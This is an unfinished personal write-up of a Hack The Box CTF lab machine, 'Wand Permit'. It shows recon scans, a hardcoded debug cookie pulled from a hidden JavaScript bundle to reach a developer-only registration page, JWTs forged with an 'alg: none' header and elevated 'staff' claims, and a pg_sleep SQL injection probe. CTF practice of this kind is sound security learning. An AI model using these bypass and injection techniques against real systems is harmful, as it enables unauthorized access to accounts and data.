# HTB University CTF 2022 - `Fullpwn` - Wand Permit

Start: 2nd December 2022 - 10:41pm

End:

Setup
```console
$ export IP=10.129.255.242
$ mkdir nmap
```
Added `wandpermit.htb` to `/etc/hosts`.

Initial Scan
```
$ nmap -A -T5 $IP -vv -oN nmap/initial

[REDACTED]

$ cat nmap/inital | grep open
80/tcp   open  http       syn-ack Werkzeug/2.2.2 Python/3.8.10
5432/tcp open  postgresql syn-ack PostgreSQL DB 9.6.0 or later
```

Full Port Scan
```
$ sudo nmap -sS -T5 -n -p- $IP -vv -oN nmap/full

[REDACTED]
80/tcp   open  http       syn-ack ttl 62
5432/tcp open  postgresql syn-ack ttl 62
```
No additional **TCP** ports open.

Visiting at the web server resulted in a login page.

Scanning for directories with `dirb/common.txt`:
```console
$ gobuster dir -u $IP -w /usr/share/wordlists/dirb/common.txt -t 20 -o gobuster/common.txt
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.255.242
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Timeout:                 10s
===============================================================
2022/12/02 09:53:43 Starting gobuster in directory enumeration mode
===============================================================
/app                  (Status: 302) [Size: 197] [--> login]
/forgotpassword       (Status: 200) [Size: 1245]
/login                (Status: 200) [Size: 1445]
/logout               (Status: 302) [Size: 197] [--> login]
/meetings             (Status: 302) [Size: 197] [--> login]
/robots.txt           (Status: 200) [Size: 46]
/search               (Status: 302) [Size: 197] [--> login]
Progress: 4392 / 4615 (95.17%)===============================================================
2022/12/02 09:53:52 Finished
===============================================================
```

`/robots.txt` revealed the following information:
```
User-agent: * 
Disallow: /static/CHANGELOG.txt
```

In `/static/CHANGELOG.txt`:
```
Version 2.4.0
-------------------------
- Removed hardcoded secrets on core.js, might need more cleaning on other files

Version 2.3.0
------------------------
- Added manifest plugin to webpack for an upcoming feature

Version 2.2.0
------------------------
- Cleaned up unused files

Version 2.1.0
------------------------
- Temporarily disabled registrations to normal users due to issues again

Version 2.0.0
------------------------
- Added special feature that allows only developers to access certain features

Version 1.3.0
------------------------
- Added webpack for static file bundling

Version 1.2.0
------------------------
- Added base45 encoding support for the new Wizard ID's

Version 1.1.0
------------------------
- Fixed issues on registration

```

Found a url in `/static/main-bundle.js`:
```
/testing/dev/api/v3/register
```
But upon visiting the link, it says we need to access it as developer. Then we get redirected back to `/login`.

`CHANGELOG.txt` mentioned about `manifest`, I googled about `manifest plugins`, and eventually I saw [this thread](https://stackoverflow.com/questions/57661590/purpose-of-webpack-manifest-plugin-in-webpack).

It says:
> WebpackManifestPlugin uses Webpack's manifest data data to emit a JSON file (that you can call manifest.json or whatever you want).

So I gave a shot at `/static/manifest.json`, and this is what I got:
```json
{
  "main.css": "auto/minicssextract.css",
  "main.js": "auto/main-bundle.js",
  "dev.js": "auto/dev-48644bcc829deeffe29e-bundle.js"
}
```

Now I have access to another minified javascript file! As javascript files are served in the `/static` directory, I went to `/static/dev-48644bcc829deeffe29e-bundle.js`. In that file, this variable caught my attention:
```js
const t = ["5306hZYOBb", "46144oFYHui", "2092674nyhxib", "1328703RvoYdl", "1809168oMTOCe", "getTime", "expires=", "9561972IksZju", "x-debug-key-v3", "038663befb1ad868a62035cf5d685adb", "cookie", "2122473ZOLSGJ", "1224815cYPzDr", "toUTCString", "setTime"];
```
It looks like some random value plus a `cookie` to me. My instinct told me that `x-debug-key-v3` and `038663befb1ad868a62035cf5d685adb` is the value of the cookie.

So I try to make a curl request to `/testing/dev/api/v3/register` with the cookie:
```
$ curl http://wandpermit.htb/testing/dev/api/v3/register --cookie "x-debug-key-v3=038663befb1ad868a62035cf5d685adb" 
```

And I can view the page without being redirected! It is a form to register a new user.

For easier access, I added the cookie to my browser using the console:
```console
document.cookie = "x-debug-key-v3=038663befb1ad868a62035cf5d685adb";
```
Then I refresh the page to fill in the form with the following details:
```
Email: ryzh3n@apu.com
Password: test123
First Name: Lai
Last Name: Zhen
Address: apu
City: KL
Date of Birth: 08/28/2000
```

Then I proceed to login with the email and password.

```
email=newadmin@apu.com&password=test123&firstname=Lai&lastname=Zhen&address=apu&city=KL&dob=2000-08-28
```

JWT before verification:
```
eyJlbWFpbCI6InJ5emgzbkBhcHUuY29tIiwiaWQiOjksInN0YWZmIjpmYWxzZSwidmVyaWZpZWQiOmZhbHNlfQ.Y4rT5Q.qEowvC0JO_cA1RjSVdcdlHZL_Js
```

Base64 encoded of `{"typ":"JWT","alg":"none"}`:
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0
```

Prepended JWT header: 
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJlbWFpbCI6InJ5emgzbkBhcHUuY29tIiwiaWQiOjksInN0YWZmIjpmYWxzZSwidmVyaWZpZWQiOmZhbHNlfQ.Y4rT5Q.qEowvC0JO_cA1RjSVdcdlHZL_Js
```
It logs me out after refreshing the page.

Modified JWT: `"staff":true`
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJlbWFpbCI6InJ5emgzbkBhcHUuY29tIiwiaWQiOjksInN0YWZmIjp0cnVlLCJ2ZXJpZmllZCI6dHJ1ZX0.Y4rNKA.yw1fIu2GoaQCHtIBwxKLioJMCFk
```
Same, no luck.

JWT after verification:
```
eyJlbWFpbCI6InJ5emgzbkBhcHUuY29tIiwiaWQiOjksInN0YWZmIjpmYWxzZSwidmVyaWZpZWQiOnRydWV9.Y4rWHg.Lf_R07r7NCn82Xmcj4G3nZ61MqA
```

Prepended JWT header after verification:
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJlbWFpbCI6InJ5emgzbkBhcHUuY29tIiwiaWQiOjksInN0YWZmIjpmYWxzZSwidmVyaWZpZWQiOnRydWV9.Y4rWHg.Lf_R07r7NCn82Xmcj4G3nZ61MqA
```
Still logs me out.

At this point, these are my thoughts:
1. `/meetings`, but it says we need to be staff to view this page. So i think it should be JWT related.
2. SQLinjection, but whenever I inject something like `1;(select 1 from pg_sleep(5))`, or running sqlmap, the web server crashes. It becomes `INTERNAL SERVER ERROR  500` and I have to restart the instance.
3. `/verification`, there'a QR code and it translates to the following string:
```
MPFPEDWE4$96JF6UF4B$DXEDWE41G49$CVKETPEB$DD3DSPC7ECJUDUPC%ZD3Q5R.C4LE1WE..DF$DWE4EF4VKEP$D:KEIE4$F4HEC1WE..DF$DWE4/E4$/EHECIE4QF45VCZKEZQEWE4CF4V9EZEDU1D82B VD.OE9F63Q5OPCRWEWE4GF46$CSUENT93/DTVDHWEO-D3Q5GVCCICWF70A6QF65W55W5+K6Z2
```
  I have no idea what it means. But we are required to upload a photo of `Wizard ID` to verify our account. I uploaded the example photo given and it says im verified, idk how it checks for the photo but the JWT changed abit after verification.

4. In `scheduling a meeting`, I've tried injecting `XSS`, `SSTI` in the `city` parameter, but it is not working.
